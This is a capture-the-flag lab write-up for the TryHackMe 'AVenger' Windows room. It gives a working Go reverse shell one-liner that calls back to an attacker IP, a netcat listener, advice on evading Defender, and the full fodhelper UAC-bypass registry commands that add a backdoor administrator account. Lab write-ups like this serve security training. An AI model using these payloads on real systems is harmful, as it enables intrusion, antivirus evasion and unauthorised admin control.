# AVenger

https://tryhackme.com/room/avenger, difficulty MEDIUM

A fun room thanks to its initial foothold. Always good to see some Windows machines to hack :)

1. Initial scans will reveal the normal raft of ports that a windows server will expose by default. Of note is port **80**, showing the machine is hosting a webserver.

2. On port **80** is a file listing, revealing XAMPP has been used as the webserver. There are a few pieces of information available, including a PHPInfo page that reveals the server OS as **Windows Server 2019**

3. Browsing to `/app` will attempt to redirect to `avenger.tryhackme/app`, so a host entry needs to be created so that this resolves.

4. On the site once it has resolved is something like a HR page for a superhero team. Of note here is a submission form, that allows you to select a file. Once submitting something a popup appears saying the HR team will review submissions very closely.

All this provides enough information to identify the foothold:

- the room is called AVenger, e.g. AV or antivirus is the challenge
- its server 2019, and the room notes indicate its 'fully patched' with defender (default AV for windows) enabled
- upload form that accepts files, and an indication that the forms contents and the files will be 'reviewed'

So an informed guess would be an AV bypass challenge, with you submitting something like a rev shell, hoping AV doesn't remove it, then catching it when some process runs it. My go to for bypassing defender is using a golang binary, as even an internet connected and patched windows machine will normally not pickup a go binary unless you are using one that has been in use by others enough for it to appear on the radar of Microsoft.

5. The go used is created via `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.217.43:5555");cmd:=exec.Command("cmd");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > t.go`. This is broadly identical to the payload suggested by something like https://www.revshells.com/ for go. Note that the shell specified is 'cmd' and the reverse ip must be set correctly to the attacker machine.

6. It can be compiled on linux with `GOOS=windows GOARCH=amd64 go build t.go` however this may not work, since it will likely build for modern OS's like Windows 10, 11 and Server 2019 is getting a bit old. If you have a windows machine handy, its just `go build t.go` but you might need to ensure the encoding of `t.go` is UTF-8 (Powershell sets something weird that Golang then complains about NUL errors for).

7. Upload the resulting t.exe to the AVenger's app site. Ensure that you have a rev shell catcher on your attack box, e.g. `nc -nvlp 5555`. After a moment or two you will get a revshell as 'hugo'.

8. The user flag is under `c:\users\hugo\desktop\user.txt`.

To privesc to root is fairly simple, as hugo is a member of the administrators group (`whoami /groups`). However, UAC (user access control) is enabled, a control that means hugo needs to interact with a prompt to assume higher privileges. This explains why, despite being an admin, `whoami /priv` is very empty. A second indicator is something like `medium integrity` mandatory access control under `/groups`, indicating restricted rights until the UAC prompt is accepted. Despite not being a security control per se, being largely there to stop malicious binaries doing things with admin privileges (as we are trying to do), it is effective because we do not have Hugo's password and so cannot just remote in to the machine to interact with the prompt.

The solution, which is common and still works on Server 2019, is the [fodhelper](https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper/) trick. This is a process that will run as a high integrity process even without accepting the UAC prompt, and will run whatever is placed in a specific registry value.

9. Switch to a powershell session if not already in one (command line will be prefixed with 'PS') by running `ps`
10. Come up with a command payload. We are going to create a new admin user with a known password, via `cmd.exe /c net user test123 Password123! /add && net localgroup administrators test123 /add`
11. Run the following commands one by one to get fodhelper to run this as admin (note our command payload in the third line):

    ```powershell
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c net user test123 Password123! /add && net localgroup administrators test123 /add" -Force
    Start-Process "C:\Windows\System32\fodhelper.exe"
    ```

    You can confirm it worked by running `net user test123`

12. Using remmina on linux or whatever remote desktop tool (e.g. freerdp), or mstsc/Remote Desktop from a windows attack box, connect to the machine with the new test123:Password123! credentials.

You should be able to access `c:\users\administrator\desktop\root.txt` to get the final flag.
